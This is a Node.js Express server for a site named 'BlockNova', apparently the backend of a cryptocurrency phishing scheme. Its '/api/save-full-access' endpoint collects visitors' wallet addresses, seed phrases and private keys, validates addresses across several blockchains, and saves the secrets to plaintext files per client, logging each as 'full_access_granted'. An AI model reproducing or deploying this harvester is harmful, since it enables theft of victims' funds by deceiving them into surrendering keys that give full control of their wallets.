const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

const DATA_DIR = path.join(__dirname, 'data');
const CLIENTS_DIR = path.join(DATA_DIR, 'clients');

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(CLIENTS_DIR)) fs.mkdirSync(CLIENTS_DIR);

function getClientDir(address) {
  const safeAddress = address.toLowerCase().replace(/[^a-z0-9]/g, '');
  return path.join(CLIENTS_DIR, safeAddress);
}

// Валидация адресов
const addressValidators = {
  ethereum: /^0x[a-fA-F0-9]{40}$/,
  solana: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
  bsc: /^0x[a-fA-F0-9]{40}$/,
  tron: /^T[A-Za-z1-9]{33}$/
};

function isValidAddress(address, chain) {
  address = address.trim();
  if (chain === 'ethereum' || chain === 'bsc') {
    return addressValidators.ethereum.test(address);
  } else if (chain === 'solana') {
    return addressValidators.solana.test(address);
  } else if (chain === 'tron') {
    return addressValidators.tron.test(address);
  }
  return false;
}

// Главная страница
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Личный кабинет
app.get('/client/:address', (req, res) => {
  const address = req.params.address;
  const clientDir = getClientDir(address);
  
  if (!fs.existsSync(clientDir)) {
    return res.sendFile(path.join(__dirname, 'public', 'not-found.html'));
  }
  res.sendFile(path.join(__dirname, 'public', 'client.html'));
});

// Сохранение данных
app.post('/api/save-full-access', (req, res) => {
  try {
    let { address, mnemonic, privateKey, username, email, chain = 'ethereum' } = req.body;

    address = address?.trim();
    username = username?.trim();
    email = email?.trim();
    chain = chain.toLowerCase();

    if (!address) {
      return res.status(400).json({ error: "Укажите адрес кошелька" });
    }

    if (!isValidAddress(address, chain)) {
      return res.status(400).json({ 
        error: `❌ Некорректный адрес для сети ${chain.toUpperCase()}` 
      });
    }

    if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return res.status(400).json({ error: "❌ Введите корректный email" });
    }

    const clientDir = getClientDir(address);
    const isNewClient = !fs.existsSync(clientDir);

    if (isNewClient) {
      fs.mkdirSync(clientDir, { recursive: true });
    }

    const infoPath = path.join(clientDir, 'info.json');
    let info = fs.existsSync(infoPath) ? JSON.parse(fs.readFileSync(infoPath, 'utf8')) : {};

    info.address = address;
    info.chain = chain;
    if (username) info.username = username;
    if (email) info.email = email;
    info.lastAccess = new Date().toISOString();
    if (isNewClient) info.createdAt = new Date().toISOString();

    fs.writeFileSync(infoPath, JSON.stringify(info, null, 2));

    if (mnemonic?.trim()) {
      fs.writeFileSync(path.join(clientDir, 'seed.txt'), mnemonic.trim());
    }
    if (privateKey?.trim()) {
      fs.writeFileSync(path.join(clientDir, 'privateKey.txt'), privateKey.trim());
    }

    const historyPath = path.join(clientDir, 'history.json');
    let history = fs.existsSync(historyPath) ? JSON.parse(fs.readFileSync(historyPath, 'utf8')) : [];
    
    history.push({
      action: isNewClient ? "full_access_granted" : "data_updated",
      chain: chain,
      timestamp: new Date().toISOString()
    });
    
    fs.writeFileSync(historyPath, JSON.stringify(history, null, 2));

    console.log(`${isNewClient ? '🆕 Новый' : '🔄 Обновлён'} клиент (${chain}): ${address}`);

    res.json({ 
      success: true, 
      message: isNewClient ? "Аккаунт успешно создан!" : "Данные успешно обновлены!",
      redirect: `/client/${address}` 
    });

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Внутренняя ошибка сервера" });
  }
});

// Получение данных клиента
app.get('/api/client/:address', (req, res) => {
  const address = req.params.address;
  const clientDir = getClientDir(address);

  if (!fs.existsSync(clientDir)) {
    return res.status(404).json({ error: "Клиент не найден" });
  }

  const infoPath = path.join(clientDir, 'info.json');
  const info = JSON.parse(fs.readFileSync(infoPath, 'utf8'));
  res.json(info);
});

const PORT = 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 BlockNova запущен на порту ${PORT}`);
  console.log(`   Локально: http://localhost:${PORT}`);
  console.log(`   В сети:   http://ВАШ_IP:${PORT}`);
});